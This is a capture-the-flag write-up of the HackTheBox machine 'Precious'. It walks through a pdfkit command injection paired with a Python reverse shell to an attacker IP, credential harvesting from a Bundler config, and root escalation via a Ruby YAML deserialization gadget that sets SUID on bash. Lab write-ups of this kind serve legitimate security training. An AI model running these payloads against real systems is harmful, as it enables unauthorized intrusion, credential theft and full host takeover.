## Precious | HackTheBox

You can access machine [here](https://app.hackthebox.com/machines/Precious)

<img src="https://user-images.githubusercontent.com/67650329/206099623-6bcf5231-5277-470d-8cb4-8210506c554d.png" width="300px" align="center">

---

### Scanning / Enumeration 

`nmap -sC -sV -p- -T4 {IP}`

-sC = Run the default script.

-sV = Version of services.

-p- = Checking for all port.

-T4 = Scanning speed.

This is the result for the scanning with nmap tools:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb12.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/VrnbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu180/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRR7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3iaVGerd61PODck=
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdcv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SNOp815Y=
|   256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED2551
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvZ66Qb
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Port open:

- 22 = SSH.
- 80 = HTTP.

Port 80 open we can access the website.

<img src="https://user-images.githubusercontent.com/67650329/206101037-848f0f1f-2e52-4587-99fb-723c8a992753.png" width="500px" align="center">

This is the website Convert Web Page to PDF for port 80.

Can try to use python http server to get my machine web page pdf.

`python3 -m http.server 80`

<img src="https://user-images.githubusercontent.com/67650329/206101744-1907c687-ee20-45a3-808f-b498cbb36368.png" width="500px" align="center">

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.189 - - [06/Dec/2022 07:23:22] "GET / HTTP/1.1" 200 â€“
```

We get the our machine pdf webpage.

We can try to search this pdf information use exiftool.

`exiftool [name_file]`

```
ExifTool Version Number         : 12.44
File Name                       : [name_file]
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2022:12:06 07:23:23-05:00
File Access Date/Time           : 2022:12:06 07:23:26-05:00
File Inode Change Date/Time     : 2022:12:06 07:23:26-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```
We got the version of pdfkit that is v0.8.6. We can search on searchengine the exploit of the version.

https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

We can test the exploit from the website.

### Gaining Access / Exploitation

<img src="https://user-images.githubusercontent.com/67650329/206104612-fe9d9fe2-835e-4656-84f7-78af05d70ca8.png" width="500px" align="center">
<img src="https://user-images.githubusercontent.com/67650329/206104790-fa35550e-e6e4-4d87-a3cd-a24b755950ce.png" width="500px" align="center">

We can exploit the website use this method.

We can try use revshell. https://www.revshells.com/

This is the revshell.
```
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.93",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

This is mix the exploit method and the revshell.
```
http://[Machine_IP]/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.93",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
```

Before run the exploit, Don't forget to run the listener.

### Maintaining Access / Post Exploitation

`nc -lvnp 4444`

```
listening on [any] 4444 ...
connect to [10.10.14.93] from (UNKNOWN) [10.10.11.189] 37940
$ whoami
whoami
ruby
$ ls -la
ls -la
total 32
drwxr-xr-x 5 ruby ruby 4096 Dec  6 01:55 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Dec  6 01:04 .cache
drwx------ 3 ruby ruby 4096 Dec  6 01:49 .gnupg
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
$ cd .bundle
cd .bundle
$ ls
ls
config
$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q***H"
```

We're inside the ruby machine. And we got the another user.

We can use ssh to enter the henry machine.

```
ssh henry@10.10.11.189
henry@precious:~$ whoami
henry
henry@precious:~$ ls
user.txt
henry@precious:~$ cat user.txt
d****b
```

We got the user.txt and the last we need to access the administrator of this machine.

```
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
```
henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
```
henry@precious:~$ find / -type f -name dependencies.yml
/opt/sample/dependencies.yml
henry@precious:~$ cat /opt/sample/dependencies.yml
yaml: 0.1.1
pdfkit: 0.8.6
```
We got the yaml version that is 0.1.1. We can search the vulnerability from this version.

https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

```
henry@precious:~$ nano dependencies.yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```
Change the git_set `sleep 600 to chmod +s /bin/bash`.
```
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:~$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
```
We are into the root/administrator machine and we got the root for this machine.

Thank you for reading ðŸ‘‹. 

---
